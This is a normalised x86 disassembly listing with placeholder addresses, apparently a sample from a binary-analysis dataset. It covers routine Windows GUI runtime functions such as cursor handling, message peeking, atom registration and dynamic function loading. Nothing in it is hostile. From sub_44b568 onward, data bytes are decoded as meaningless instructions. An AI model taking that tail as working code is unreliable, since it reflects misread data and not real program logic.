je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43fad0
jmp r-xdata
mov eax edi
call sub_45cc74
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43f550
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43fbb0
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f94
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a240
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_446450
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_440258
jmp r-xdata
sub_44aab8
inc ebp
cld
mov eax [ eax + 0x14 ]
call sub_43f6f4
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_446450
cmp eax [ ebx + 0x4 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac4b
lea eax [ ebp - 0x48 ]
call sub_403f40
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_444f80
test eax eax
jle r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_44aadb
cld
mov eax [ eax + 0x14 ]
call sub_446450
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_444f80
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac4b
lea eax [ ebp - 0x48 ]
call sub_403f40
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4492fc
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_44ac54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44adc8
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44ace4
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ada0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_44ad48
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44ad78
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406dcc
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44ada0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ad14
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44adc8
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44ad2c
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44ad48
pop ebx
retn
mov eax ebx
call sub_44ad78
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44ae2c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44af92
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44b0b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44b094
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44b094
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44b1fc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40316c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40316c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_40316c
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_40316c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f40
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f40
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44b284
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b3fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409118
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f94
mov eax [ rw-data ]
call sub_404400
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409118
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f94
mov eax [ rw-data ]
call sub_404400
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404400
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ rw-data ] eax
call sub_44ae2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ac54
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45dc50
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ed34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46091c
mov ecx r-xdata
mov edx sub_43cc6c
mov eax [ r-xdata ]
call sub_41785c
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b403
lea eax [ ebp - 0x10 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44b46c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44b4cb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b4d2
retn
mov eax rw-data
call sub_40d3ac
call sub_44b1fc
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4049c8
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_403f40
sub_44b4d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44b55a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b561
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44b284
mov eax [ r-xdata ]
call sub_4176d0
mov eax [ r-xdata ]
call sub_417770
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41771c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41771c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41771c
sub_44b568
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
mov ch 0x44
add [ esi + esi * 4 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
mov dh 0x44
add [ esi + esi * 4 ] ah
inc esp
add [ eax ] ah
add [ eax ] al
inc eax
imul eax [ ecx ] sub_41ee48
shl [ ebx ] 0x40
add [ edi + 0x33c80041 ] bl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop eax
mov edx 0x858c0044
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ eax + eax ] al
clc
sub_44b60e
out dx eax
push edx
push ecx
[ eax - 0x3bffbb45 ]
mov ebx 0xbaa80044
inc esp
add [ eax + 0x100044ba ] bh
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xb7
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x3c00408d
mov dh 0x44
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
inc esp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ esi ] ah
mov bh 0x44
add [ eax ] ch
add [ eax ] al
pushad
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al ah
mov esp 0x858c0044
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
mov bh 0x44
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
in al dx
imul eax [ ecx ] 0x41080003
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x10940001
inc eax
add [ eax ] bl
add bh bh
inc esp
mov ebx 0xbaa40044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080002 ] al
popad
je r-xdata
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
insb
popfd
inc ecx
je r-xdata
add [ eax ] bh
jmp r-xdata
outsd
jb r-xdata
add [ eax ] ah
xor [ eax ] eax
or cl al
inc esp
add [ eax - 0x3f ] bl
inc ebx
jne r-xdata
add [ ebp + eax * 4 - 0x6e9bffbf ] cl
inc ecx
enter 0x4033 0x0
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
add [ esp + edi * 4 + 0x44 ] dh
add [ eax - 0x3bffbb42 ] cl
mov ebp 0x40044
std
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 ] cl
inc esp
mov eax eax
aam 0xb6
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 ] bh
and bh al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc esp
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc eax
add [ eax ] cl
rol [ eax + eax + 0x58 ] 0xc1
dec esp
imul esi [ ebx + 0x74 ] 0xb85cc08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax + edx * 4 + 0x41 ] bl
add [ eax ] dl
inc ecx
add [ eax - 0x60 ] cl
inc ecx
add [ eax + 0x41 ] cl
add [ eax - 0x60 ] dl
inc ecx
add [ edx * 4 - 0x5e3bffbf ] ah
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ah
fwait
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop esp
push 0x20041
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
sub bl ch
inc ecx
inc ebx
jne r-xdata
inc ecx
add [ eax ] dh
mov [ 0xffffffffa3a40041 ] eax
inc ecx
add [ edi + eax * 8 ] ch
inc esp
add ah dl
popfd
inc ecx
add [ edi + ecx * 4 - 0x618fffbf ] ah
inc ecx
add [ eax + 0x1c00419e ] dh
lahf
inc ecx
add al dl
xchg esp eax
inc ecx
add [ eax - 0x6927ffbf ] ch
inc ecx
add [ edi + edx * 4 - 0x5f17ffbf ] ch
inc ecx
add al bh
mov al [ 0xffffffff98100041 ]
inc ecx
add [ eax + ebx * 4 + 0x41 ] ah
add [ eax ] dl
cdq
inc ecx
add [ eax + 0x419a ] ch
fwait
inc ecx
add [ ebx + ebx * 4 - 0x61c7ffbf ] dl
inc ecx
add [ esi + ebx * 4 + 0x41 ] dl
add [ ecx + 0x41 ] cl
add [ edi + ebx * 4 - 0x5ca3ffbf ] bl
inc ecx
add [ ebx + 0x41 ] ch
add [ 0x6f685354 ] cl
jb r-xdata
and al 0x95
inc ecx
add ah al
mov eax [ 0xffffffffa2200041 ]
inc ecx
add ah dh
mov [ 0xffffffff9be40041 ] al
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebp + ebx * 4 + 0x41 ] ch
dec esp
imul esi [ ebx + 0x74 ] 0xb7b00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x48 ] cl
inc esp
add [ eax ] dh
add [ eax ] al
add [ esi + ebx * 2 + 0x33b40041 ] ah
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
add [ eax ] al
add al [ eax ]
out dx al
add [ eax + esi * 8 - 0x4537ffbf ] al
inc esp
add [ esi + eax * 8 ] ah
inc esp
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + eax * 8 - 0xebbffbc ] dh
inc ecx
add al ch
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xchg esp eax
pop edi
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb8cc0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov ecx 0xb9640044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x47 ] al
inc esp
add [ eax - 0x47 ] dl
inc esp
add [ eax + 0x64000000 ] ah
mov ch 0x44
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
sub_44b6e3
add [ esi + edi * 4 ] al
inc esp
add [ eax ] bh
jmp r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax + edx * 4 + 0x41 ] bl
add [ eax ] dl
inc ecx
add [ eax - 0x60 ] cl
inc ecx
add [ eax + 0x41 ] cl
add [ eax - 0x60 ] dl
inc ecx
add [ edx * 4 - 0x5e3bffbf ] ah
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ah
fwait
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop esp
push 0x20041
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] ah
xor [ eax ] eax
or cl al
inc esp
add [ eax - 0x3f ] bl
inc ebx
jne r-xdata
inc ecx
add [ eax ] dh
mov [ 0xffffffffa3a40041 ] eax
inc ecx
add [ edi + eax * 8 ] ch
inc esp
add ah dl
popfd
inc ecx
add [ edi + ecx * 4 - 0x618fffbf ] ah
inc ecx
add [ eax + 0x1c00419e ] dh
lahf
inc ecx
add al dl
xchg esp eax
inc ecx
add [ eax - 0x6927ffbf ] ch
inc ecx
add [ edi + edx * 4 - 0x5f17ffbf ] ch
inc ecx
add al bh
mov al [ 0xffffffff98100041 ]
inc ecx
add [ eax + ebx * 4 + 0x41 ] ah
add [ eax ] dl
cdq
inc ecx
add [ eax + 0x419a ] ch
fwait
inc ecx
add [ ebx + ebx * 4 - 0x61c7ffbf ] dl
inc ecx
add [ esi + ebx * 4 + 0x41 ] dl
add [ ecx + 0x41 ] cl
add [ edi + ebx * 4 - 0x5ca3ffbf ] bl
inc ecx
add [ ebx + 0x41 ] ch
add [ 0x6f685354 ] cl
jb r-xdata
and al 0x95
inc ecx
add ah al
mov eax [ 0xffffffffa2200041 ]
inc ecx
add ah dh
mov [ 0xffffffff9be40041 ] al
dec esp
imul esi [ ebx + 0x74 ] 0xb7b00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x48 ] cl
inc esp
add [ eax ] dh
add [ eax ] al
add [ esi + ebx * 2 + 0x33b40041 ] ah
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebp + ebx * 4 + 0x41 ] ch
add [ ebp + eax * 4 - 0x6e9bffbf ] cl
inc ecx
and bh al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc esp
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc eax
add [ eax ] cl
rol [ eax + eax + 0x58 ] 0xc1
dec esp
imul esi [ ebx + 0x74 ] 0xb85cc08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
sub bl ch
inc ecx
inc ebx
jne r-xdata
add [ eax ] al
add al [ eax ]
out dx al
add [ eax + esi * 8 - 0x4537ffbf ] al
inc esp
add [ esi + eax * 8 ] ah
inc esp
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + eax * 8 - 0xebbffbc ] dh
inc ecx
add al ch
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xchg esp eax
pop edi
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb8cc0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov ecx 0xb9640044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x47 ] al
inc esp
add [ eax - 0x47 ] dl
inc esp
add [ eax + 0x64000000 ] ah
mov ch 0x44
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
sub_44b710
stc
push ebx
push eax
push [ eax ]
mov ebp 0xbd780044
inc esp
add [ edi + edi * 4 + 0x44 ] bh
add [ edi + edi * 4 + 0x54110044 ] bl
inc ebx
jne r-xdata
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
insb
popfd
inc ecx
je r-xdata
add [ eax ] ah
xor [ eax ] eax
or cl al
inc esp
add [ eax - 0x3f ] bl
inc ebx
jne r-xdata
add [ ebp + eax * 4 - 0x6e9bffbf ] cl
inc ecx
enter 0x4033 0x0
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
and bh al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc esp
add [ eax - 0x16 ] dl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc eax
add [ eax ] cl
rol [ eax + eax + 0x58 ] 0xc1
dec esp
imul esi [ ebx + 0x74 ] 0xb85cc08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax + edx * 4 + 0x41 ] bl
add [ eax ] dl
inc ecx
add [ eax - 0x60 ] cl
inc ecx
add [ eax + 0x41 ] cl
add [ eax - 0x60 ] dl
inc ecx
add [ edx * 4 - 0x5e3bffbf ] ah
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ah
fwait
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop esp
push 0x20041
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
sub bl ch
inc ecx
inc ebx
jne r-xdata
inc ecx
add [ eax ] dh
mov [ 0xffffffffa3a40041 ] eax
inc ecx
add [ edi + eax * 8 ] ch
inc esp
add ah dl
popfd
inc ecx
add [ edi + ecx * 4 - 0x618fffbf ] ah
inc ecx
add [ eax + 0x1c00419e ] dh
lahf
inc ecx
add al dl
xchg esp eax
inc ecx
add [ eax - 0x6927ffbf ] ch
inc ecx
